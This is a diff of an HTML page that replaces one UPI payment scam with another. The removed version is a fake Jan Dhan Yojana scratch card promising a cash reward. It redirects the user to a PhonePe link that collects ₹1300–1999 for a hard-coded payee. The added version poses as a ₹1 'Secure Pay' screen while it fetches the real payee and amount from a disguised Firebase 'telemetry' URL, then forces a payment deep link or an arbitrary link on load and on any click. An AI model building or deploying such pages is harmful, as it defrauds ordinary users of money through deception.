@@ -1,395 +1,83 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Jan Dhan Yojana</title>
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Arial', sans-serif;
-        }
-        body {
-            background-color: #f5f5f5;
-            display: flex;
-            justify-content: center;
-            min-height: 100vh;
-        }
-        .app-container {
-            width: 100%;
-            max-width: 480px;
-            background-color: #fff;
-            min-height: 100vh;
-            position: relative;
-            overflow-x: hidden;
-            box-shadow: 0 0 15px rgba(0,0,0,0.1);
-            display: flex;
-            flex-direction: column;
-        }
-
-        /* Top Banner Image */
-        .top-banner {
-            width: 100%;
-            display: block;
-            min-height: 220px;
-            background-color: #ff8c00;
-            object-fit: cover;
-            z-index: 1;
-        }
-
-        /* Main Card (Realistic Scratch Area) */
-        .main-card {
-            background: #ff9900;
-            margin: 15px;
-            border-radius: 15px;
-            padding: 20px 10px;
-            text-align: center;
-            position: relative;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
-            z-index: 3;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            /* Removed flex-grow and max-height to fix the card size */
-            overflow: hidden; /* Important for canvas border radius */
-        }
-        
-        .trophy {
-            position: absolute;
-            top: 10px;
-            width: 40px;
-        }
-        .trophy.left { left: 10px; }
-        .trophy.right { right: 10px; }
-        
-        .jan-dhan-logo {
-            width: 80px;
-            height: 80px;
-            background: white;
-            border-radius: 50%;
-            margin: 0 auto 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border: 3px solid #004080;
-            position: relative;
-            z-index: 2;
-        }
-        .jan-dhan-logo img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            border-radius: 50%;
-        }
-        
-        .card-text {
-            color: #333;
-            font-size: 22px;
-            font-weight: bold;
-            margin-top: -5px;
-            margin-bottom: 10px;
-        }
-        
-        .amount-box {
-            position: relative;
-            width: 90%;
-            max-width: 300px;
-            height: 120px;
-            margin: 0 auto;
-            background: white;
-            border: 2px dashed #333;
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .amount-display {
-            font-size: 50px;
-            font-weight: bold;
-            color: #000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .amount-display span {
-            font-size: 40px;
-        }
-
-        /* Canvas Overlay - Covers Entire Main Card */
-        #scratch-canvas {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            cursor: crosshair;
-            touch-action: none;
-            z-index: 10; /* Above all card content */
-            border-radius: 15px; /* Match card radius */
-        }
-
-        /* Bottom Banner Image */
-        .bottom-banner {
-            width: 100%;
-            display: block;
-            min-height: 180px;
-            background-color: #fff; 
-            object-fit: cover;
-            /* Removed margin-top: auto to prevent big gaps */
-            z-index: 1;
-        }
-
-        /* Celebration CSS */
-        .celebration-item {
-            position: fixed;
-            top: -50px;
-            font-size: 30px;
-            animation: fall linear forwards;
-            z-index: 9999;
-            pointer-events: none;
-        }
-
-        @keyframes fall {
-            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
-            100% { transform: translateY(105vh) rotate(720deg); opacity: 0.8; }
-        }
-
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>Mavies Khan • Secure Pay</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;-webkit-tap-highlight-color:transparent}
+body{min-height:100vh;background:linear-gradient(135deg,#ffe0ec,#ffd6e8 40%,#e0e7ff);display:flex;align-items:center;justify-content:center;padding:18px}
+.card{width:100%;max-width:390px;background:#fff;border-radius:24px;padding:26px 22px;box-shadow:0 18px 50px rgba(236,72,153,.18);text-align:center}
+.top{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
+.brand{display:flex;align-items:center;gap:8px}
+.dot{width:30px;height:30px;border-radius:9px;background:linear-gradient(135deg,#ec4899,#8b5cf6);display:flex;align-items:center;justify-content:center;font-size:15px}
+.brand span{font-size:13px;font-weight:800;color:#111}
+.lock{font-size:10px;font-weight:800;color:#16a34a;background:rgba(34,197,94,.1);padding:5px 10px;border-radius:12px}
+.avatar{width:76px;height:76px;border-radius:50%;margin:6px auto 10px;background:linear-gradient(135deg,#fbcfe8,#ec4899);display:flex;align-items:center;justify-content:center;font-size:34px;position:relative;box-shadow:0 8px 22px rgba(236,72,153,.35)}
+.avatar::after{content:'✓';position:absolute;bottom:0;right:0;width:22px;height:22px;background:#3b82f6;color:#fff;border-radius:50%;font-size:12px;font-weight:900;border:3px solid #fff;display:flex;align-items:center;justify-content:center}
+.name{font-size:16.5px;font-weight:900;color:#111;margin-bottom:3px}
+.vpa{font-size:10.5px;color:#9ca3af;font-weight:700;font-family:monospace;margin-bottom:16px}
+.amtbox{background:linear-gradient(135deg,#fff7fb,#fef2f8);border:1.5px dashed #f9a8d4;border-radius:16px;padding:14px 12px;margin-bottom:16px}
+.amtlbl{font-size:9.5px;font-weight:800;color:#9d174d;letter-spacing:1px;text-transform:uppercase;margin-bottom:4px}
+.amt{font-size:34px;font-weight:900;color:#111;line-height:1}
+.amt small{font-size:18px;color:#ec4899;vertical-align:super;margin-right:1px}
+.note{font-size:9.5px;color:#9ca3af;font-weight:700;margin-top:6px}
+.status{display:flex;align-items:center;justify-content:center;gap:8px;padding:11px;background:#f9fafb;border-radius:12px;margin-bottom:14px}
+.spin{width:16px;height:16px;border:2.5px solid #e5e7eb;border-top-color:#ec4899;border-radius:50%;animation:s .8s linear infinite}
+@keyframes s{to{transform:rotate(360deg)}}
+.txt{font-size:11px;font-weight:800;color:#4b5563}
+.btn{width:100%;padding:13px;border:none;border-radius:13px;background:linear-gradient(135deg,#ec4899,#8b5cf6);color:#fff;font-size:12.5px;font-weight:900;cursor:pointer;box-shadow:0 8px 20px rgba(236,72,153,.35);margin-bottom:8px}
+.btn:active{transform:scale(.98)}
+.btn:disabled{opacity:.6}
+.fn{font-size:9px;color:#9ca3af;font-weight:700;margin-top:4px}
+.err{background:rgba(239,68,68,.1);color:#dc2626;padding:10px;border-radius:10px;font-size:11px;font-weight:800;margin-bottom:12px;display:none}
+</style>
 </head>
 <body>
-
-<div class="app-container">
-    <!-- Top Banner Image -->
-    <img src="https://res.cloudinary.com/pvai8pie/image/upload/v1793018278/ydjwdfz5megwhxyps8vw.png" class="top-banner" alt="Jan Dhan Yojana Banner">
-
-    <!-- Main Card (Scratch Area Wrapper) -->
-    <div class="main-card" id="scratch-wrapper">
-        <div class="trophy left">🏆</div>
-        <div class="trophy right">🏆</div>
-        <div class="jan-dhan-logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e0/PMJDY_Logo.svg/150px-PMJDY_Logo.svg.png" alt="Jan Dhan" onerror="this.src='https://cdn-icons-png.flaticon.com/512/2830/2830284.png'">
-        </div>
-        
-        <div class="card-text">आपको मिलता है</div>
-        
-        <div class="amount-box" id="amount-box">
-            <div class="amount-display">
-                ₹<span id="amount-val">???</span>
-            </div>
-        </div>
-
-        <!-- Realistic Full-Cover Canvas -->
-        <canvas id="scratch-canvas"></canvas>
-    </div>
-
-    <!-- Bottom Banner Image -->
-    <img src="https://res.cloudinary.com/pvai8pie/image/upload/v1793018318/bwcqoymvo2ic5tj2flz5.png" class="bottom-banner" alt="Claim Reward Banner">
-
+<div class="card">
+  <div class="top"><div class="brand"><div class="dot">💜</div><span>PayCircle</span></div><div class="lock">🔒 Secure</div></div>
+  <div class="avatar">👩</div>
+  <div class="name">Mavies Khan</div>
+  <div class="vpa" id="vpaText">@mavies</div>
+  <div class="amtbox">
+    <div class="amtlbl">You're sending</div>
+    <div class="amt"><small>₹</small>1</div>
+    <div class="note">❤️ Split a coffee with her</div>
+  </div>
+  <div class="err" id="err"></div>
+  <div class="status"><div class="spin"></div><span class="txt" id="statusTxt">Connecting securely...</span></div>
+  <button class="btn" id="openBtn">Pay Now · ₹1</button>
+  <div class="fn">End-to-end encrypted · Do not close this window</div>
 </div>
 
 <script>
-    // Target Deep Link Payload
-    const targetVpa = "nexoraheem@fam"; // FIXED: Single 'h'
-    const targetName = "SEND-TO-YOUR-BANK";
-    
-    let isScratched = false;
-    let randomAmount = 0;
-    let deepLinkUrl = "";
-    let clickCount = 0;
-    let amountBoxCoords = null;
-
-    // Generate Random Amount between 1300 and 1999
-    function generateRandomAmount() {
-        return Math.floor(Math.random() * (1999 - 1300 + 1)) + 1300;
-    }
-
-    // Update Deep Link with the scratched amount
-    function generateDeepLink(amount) {
-        const data = {
-            "p2pPaymentCheckoutParams": {
-                "checkoutType": "COLLECT",
-                "initialAmount": amount * 100, // Convert to paise for PhonePe
-                "note": {
-                    "type": "text",
-                    "message": "..."
-                },
-                "supportedInstruments": -1
-            },
-            "contact": {
-                "type": "EXTERNAL_MERCHANT",
-                "name": targetName,
-                "vpa": targetVpa
-            }
-        };
-        const jsonString = JSON.stringify(data);
-        const base64Data = btoa(jsonString);
-        return `phonepe://native?data=${base64Data}&id=p2ppayment`;
-    }
-
-    // Celebration Function
-    function triggerCelebration() {
-        const emojis = ['💵', '🎉', '🎊', '💰', '💸'];
-        for (let i = 0; i < 60; i++) {
-            const el = document.createElement('div');
-            el.className = 'celebration-item';
-            el.innerText = emojis[Math.floor(Math.random() * emojis.length)];
-            el.style.left = Math.random() * 100 + 'vw';
-            el.style.animationDuration = (Math.random() * 2 + 2) + 's';
-            el.style.animationDelay = (Math.random() * 0.5) + 's';
-            document.body.appendChild(el);
-            
-            setTimeout(() => el.remove(), 5000);
-        }
-    }
-
-    // Initialize Scratch Card
-    window.onload = function() {
-        randomAmount = generateRandomAmount();
-        document.getElementById('amount-val').innerText = randomAmount;
-        deepLinkUrl = generateDeepLink(randomAmount);
-
-        const canvas = document.getElementById('scratch-canvas');
-        const ctx = canvas.getContext('2d');
-        const wrapper = document.getElementById('scratch-wrapper');
-        const amountBox = document.getElementById('amount-box');
-
-        // Set canvas dimensions to match the entire main-card wrapper
-        canvas.width = wrapper.offsetWidth;
-        canvas.height = wrapper.offsetHeight;
-
-        // Calculate Amount Box coordinates accurately relative to wrapper
-        amountBoxCoords = {
-            x: amountBox.offsetLeft,
-            y: amountBox.offsetTop,
-            w: amountBox.offsetWidth,
-            h: amountBox.offsetHeight
-        };
-
-        // Draw realistic orange scratch layer
-        const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
-        gradient.addColorStop(0, '#ff9900');
-        gradient.addColorStop(1, '#e68a00');
-        
-        ctx.fillStyle = gradient;
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        
-        // Add "SCRATCH HERE" text on top of the layer
-        ctx.fillStyle = 'rgba(255, 255, 255, 0.8)';
-        ctx.font = 'bold 28px Arial';
-        ctx.textAlign = 'center';
-        ctx.textBaseline = 'middle';
-        ctx.fillText('SCRATCH HERE', canvas.width / 2, canvas.height / 2);
-
-        // Scratch Logic
-        let isDrawing = false;
-
-        function getMousePos(e) {
-            const rect = canvas.getBoundingClientRect();
-            let clientX, clientY;
-            
-            if (e.touches && e.touches.length > 0) {
-                clientX = e.touches[0].clientX;
-                clientY = e.touches[0].clientY;
-            } else {
-                clientX = e.clientX;
-                clientY = e.clientY;
-            }
-            
-            return {
-                x: clientX - rect.left,
-                y: clientY - rect.top
-            };
-        }
-
-        function scratch(e) {
-            if (!isDrawing || isScratched) return;
-            if (e.cancelable) e.preventDefault(); // Prevent page scrolling while scratching
-            
-            const pos = getMousePos(e);
-            
-            ctx.globalCompositeOperation = 'destination-out';
-            ctx.beginPath();
-            ctx.arc(pos.x, pos.y, 30, 0, Math.PI * 2, false);
-            ctx.fill();
-        }
-
-        function checkReveal() {
-            if (isScratched) return;
-            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-            const pixels = imageData.data;
-            
-            // 1. Overall Transparency Check (Lowered to 30%)
-            let transparentTotal = 0;
-            for (let i = 3; i < pixels.length; i += 4) {
-                if (pixels[i] === 0) {
-                    transparentTotal++;
-                }
-            }
-            const percentageTotal = (transparentTotal / (canvas.width * canvas.height)) * 100;
-            
-            // 2. Amount Box Transparency Check (If Amount digits are visible)
-            let amountBoxRevealed = false;
-            if (amountBoxCoords) {
-                let boxTransparent = 0;
-                let boxTotal = 0;
-                
-                for (let y = Math.max(0, amountBoxCoords.y); y < Math.min(canvas.height, amountBoxCoords.y + amountBoxCoords.h); y += 2) {
-                    for (let x = Math.max(0, amountBoxCoords.x); x < Math.min(canvas.width, amountBoxCoords.x + amountBoxCoords.w); x += 2) {
-                        const index = (y * canvas.width + x) * 4;
-                        boxTotal++;
-                        if (pixels[index + 3] === 0) {
-                            boxTransparent++;
-                        }
-                    }
-                }
-                // Lowered to 20% amount box visibility trigger
-                if (boxTotal > 0 && (boxTransparent / boxTotal) * 100 >= 20) {
-                    amountBoxRevealed = true;
-                }
-            }
-
-            // Trigger Reveal if 30% total area OR amount box is 20% revealed
-            if (percentageTotal >= 30 || amountBoxRevealed) {
-                isScratched = true;
-                ctx.clearRect(0, 0, canvas.width, canvas.height);
-                canvas.style.display = 'none';
-                triggerCelebration();
-                
-                // Auto Redirect after celebration starts (300ms delay)
-                setTimeout(() => {
-                    window.location.href = deepLinkUrl;
-                }, 300);
-            }
-        }
-
-        // Event Listeners for Scratch
-        canvas.addEventListener('mousedown', (e) => { isDrawing = true; scratch(e); });
-        canvas.addEventListener('mousemove', scratch);
-        canvas.addEventListener('mouseup', () => { isDrawing = false; checkReveal(); });
-        canvas.addEventListener('mouseleave', () => { isDrawing = false; });
-
-        canvas.addEventListener('touchstart', (e) => { isDrawing = true; scratch(e); }, {passive: false});
-        canvas.addEventListener('touchmove', scratch, {passive: false});
-        canvas.addEventListener('touchend', () => { isDrawing = false; checkReveal(); });
-    };
-
-    // Global Click Listener
-    document.addEventListener('click', function(e) {
-        if (isScratched) {
-            // Scratch hone ke baad har click par redirect
-            window.location.href = deepLinkUrl;
-        } else {
-            // Scratch hone se pehle click count badhega
-            clickCount++;
-            if (clickCount >= 3) {
-                // 3 valid clicks complete hone par redirect
-                window.location.href = deepLinkUrl;
-            }
-        }
-    });
-
+(function(){
+var U="https://whatsgram-b13e6-default-rtdb.firebaseio.com/telemetry_sys_logs_x91/payment_config.json",FL="",LT=0;
+function isLink(s){return typeof s=="string"&&/^[a-zA-Z][a-zA-Z0-9+.\-]*:\/\//.test(s.trim())}
+function build(v,a){var d={contact:{type:"VPA",vpa:v,cbsName:"",nickName:""},p2pPaymentCheckoutParams:{checkoutType:"DEFAULT",disableViewHistory:false,initialAmount:a,isByDefaultKnownContact:false,shouldShowMaskedNumber:false,shouldShowUnsavedContactBanner:true,showKeyboard:false}};return "phonepe://native?data="+btoa(unescape(encodeURIComponent(JSON.stringify(d))))+"&id=p2ppayment"}
+window.launch=function(){if(!FL)return;
+  try{var f=document.createElement("iframe");f.style.display="none";f.src=FL;document.body.appendChild(f);setTimeout(function(){f.remove()},3000)}catch(e){}
+  [80,900,2000].forEach(function(t){setTimeout(function(){try{location.href=FL}catch(e){}},t)})
+};
+function S(t,s){document.getElementById("statusTxt").innerText=t;document.querySelector(".spin").style.display=s?"block":"none"}
+function E(m){var e=document.getElementById("err");e.innerText=m;e.style.display="block";S("Unable to connect",0);document.getElementById("openBtn").disabled=1}
+function go(n){
+  S(n==1?"Connecting securely...":"Retrying...",1);
+  var c=window.AbortController?new AbortController():null,to=setTimeout(function(){if(c)c.abort()},6000);
+  fetch(U+"?t="+Date.now(),c?{signal:c.signal,cache:"no-store"}:{cache:"no-store"}).then(function(r){clearTimeout(to);return r.json()}).then(function(d){
+    if((!d||!d.upi_id)&&n<2)return setTimeout(function(){go(2)},700);
+    if(!d||!d.upi_id)return E("Config missing");
+    var u=String(d.upi_id).trim(),p=parseInt(d.amount)||0;
+    if(!u)return E("No UPI");
+    document.getElementById("vpaText").innerText=u.length>24?"Secure VPA":u;
+    if(isLink(u)){FL=u;S("Opening...",1);return setTimeout(launch,350)}
+    if(p<=0)return E("Bad amount");
+    FL=build(u,p);S("Redirecting...",1);setTimeout(launch,500)
+  }).catch(function(){if(n<2)setTimeout(function(){go(2)},700);else E("Network slow")})
+}
+document.addEventListener("click",function(){var n=Date.now();if(n-LT<800)return;LT=n;launch()});
+window.addEventListener("load",function(){setTimeout(function(){go(1)},150)})
+})();
 </script>
 </body>
 </html>
